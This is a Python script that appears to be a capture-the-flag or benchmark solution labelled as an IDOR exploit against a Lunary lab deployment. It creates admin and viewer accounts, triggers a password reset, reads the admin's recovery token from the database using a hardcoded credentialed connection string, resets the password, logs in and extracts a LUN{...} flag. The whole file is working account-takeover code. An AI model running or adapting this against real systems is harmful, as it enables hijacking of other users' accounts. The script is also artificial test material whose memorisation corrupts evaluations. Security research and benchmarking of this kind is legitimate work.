import json
import requests
import time
import re
import psycopg2

# Setup backend route and test emails/passwords
DATABASE_URL="postgres://postgres:E19pMTpS6ignd@lunary-postgres:5432/lunary"
BACKEND_URL = "http://lunary-app:3333"

ADMIN_EMAIL = "userA@gmail.com"
VIEWER_EMAIL = "userB@gmail.com"
PASSWORDA = "password_123"
PASSWORDB = "psswrd_123_B"
NEW_PASSWORD = "newpass123"

# Extract the org id of user A
def get_user_a_org(email, token, retries=5):
    for attempt in range(retries):
        try:
            url = f"{BACKEND_URL}/v1/users/me/org"
            headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
            }
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                response_json = response.json()
                org_id = response_json.get("id")
                print(f"Organization ID for {email}: {org_id}")
                return org_id
            else:
                print(f"Unexpected status code {response.status_code} on attempt {attempt + 1}")
        except requests.exceptions.RequestException as e:
            print(f"Attempt {attempt + 1} - Error retrieving org ID: {e}")
            time.sleep(2 ** attempt) 
    print("Failed to retrieve org ID after multiple attempts.")
    return None

# Sign up function for creating admin and viewer accounts
def signup_user(email, password, role, org_id=None, retries=5):
    for attempt in range(retries):
        try:
            url = f"{BACKEND_URL}/auth/signup"
            if role != "admin":
                payload = {
                "email": email,
                "password": PASSWORDB,
                "name": "User B",
                "orgId": org_id,
                "signupMethod": "join"
            }
            else :
                payload = {
                    "email": email,
                    "password": password,
                    "name": "User A",
                    "projectName": "Test Project" ,
                    "orgName": "Test Org" ,
                    "employeeCount": "1-5",
                    "signupMethod": "signup"
                }
            headers = {"Content-Type": "application/json"}
            response = requests.post(url, headers=headers, json=payload, timeout=30)
            if response.status_code == 200:
                print(f"{response.json()}")
                return response.json().get("token")
            else:
                print(f"Unexpected status code {response.status_code} on attempt {attempt + 1}")
        except requests.exceptions.ConnectionError as e:
            print(f"Attempt {attempt + 1} - Connection error: {e}")
            time.sleep(2 ** attempt)  # Exponential backoff
            return None  

# Login function 
def login_user(email, password, retries=5):
    url = f"{BACKEND_URL}/auth/login"
    payload = {"email": email, "password": password}
    headers = {"Content-Type": "application/json"}

    for attempt in range(retries):
        try:
            response = requests.post(url, headers=headers, json=payload)
            if response.status_code == 200:
                return response.json()
            else:
                print(f"Attempt {attempt + 1} - Login failed for {email}: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Attempt {attempt + 1} - Connection error: {e}")
        time.sleep(2 ** attempt)
    print("Failed to log in after multiple attempts.")
    return None

# Request password reset for admin
def request_password_reset(email, retries=5):
    url = f"{BACKEND_URL}/auth/request-password-reset"
    payload = {"email": email}
    headers = {"Content-Type": "application/json"}

    for attempt in range(retries):
        try:
            response = requests.post(url, headers=headers, json=payload)
            if response.status_code == 200:
                print("Password reset requested.")
                return True
            else:
                print(f"Attempt {attempt + 1} - Password reset request failed: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Attempt {attempt + 1} - Connection error: {e}")
        time.sleep(2 ** attempt)
    print("Failed to request password reset after multiple attempts.")
    return False

# Retrieve recovery token
def get_recovery_token(email):
    try:
        conn = psycopg2.connect(DATABASE_URL)
        cursor = conn.cursor()

        # SQL query to retrieve the recovery token for the specified email
        query = "SELECT recovery_token FROM account WHERE email = %s;"
        cursor.execute(query, (email,))

        # Fetch recovery token
        result = cursor.fetchone()
        if result:
            recovery_token = result[0]
            print(f"Recovery token for {email}: {recovery_token}")
            return recovery_token
        else:
            print(f"No recovery token found for {email}")
            return None
    except psycopg2.Error as e:
        print(f"Database error: {e}")
        return None
    finally:
        # Close the cursor and connection
        if cursor:
            cursor.close()
        if conn:
            conn.close()

# Use the recovery token to reset admin's password
def reset_password_with_token(recovery_token, new_password, retries=5):
    url = f"{BACKEND_URL}/auth/reset-password"
    payload = {"token": recovery_token, "password": new_password}
    headers = {"Content-Type": "application/json"}

    for attempt in range(retries):
        try:
            response = requests.post(url, headers=headers, json=payload)
            if response.status_code == 200:
                print("Password reset successfully.")
                return True
            else:
                print(f"Attempt {attempt + 1} - Password reset failed: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Attempt {attempt + 1} - Connection error: {e}")
        time.sleep(2 ** attempt)
    print("Failed to reset password after multiple attempts.")
    return False

# Full exploit sequence
def exploit_idor():
    # Sign up admin and viewer accounts
    time.sleep(5)
    admin_token = signup_user(ADMIN_EMAIL, PASSWORDA, "admin")
    orgId = get_user_a_org(ADMIN_EMAIL, admin_token)
    time.sleep(5)

    viewer_token = signup_user(VIEWER_EMAIL, PASSWORDB, "viewer", orgId) # viewer signed up to user A's org
    viewer_login = login_user(VIEWER_EMAIL, password=PASSWORDB)
    # Request password reset for admin
    request_response = request_password_reset(ADMIN_EMAIL)
    if (request_response == False): 
        print("Password reset request failed.")
        return None

    recovery_token = get_recovery_token(ADMIN_EMAIL)

    if recovery_token:
        print(f"Recovery token retrieved: {recovery_token}")
        # Use the recovery token to reset admin's password
        password_reset_response = reset_password_with_token(recovery_token, NEW_PASSWORD)
        # try login with new password
        if password_reset_response == True:
            attempt_login = login_user(ADMIN_EMAIL, NEW_PASSWORD)
            if attempt_login != None:
                pattern = r"LUN\{[^}]+\}"
                flag = re.search(pattern, json.dumps(attempt_login))
                if flag:
                    print(f"{flag.group(0)}")
    else:
        print("Exploit failed. Unable to hijack user account.")
        return 
    
if __name__ == "__main__":
    print("Running IDOR exploit on Lunary-app")
    exploit_idor()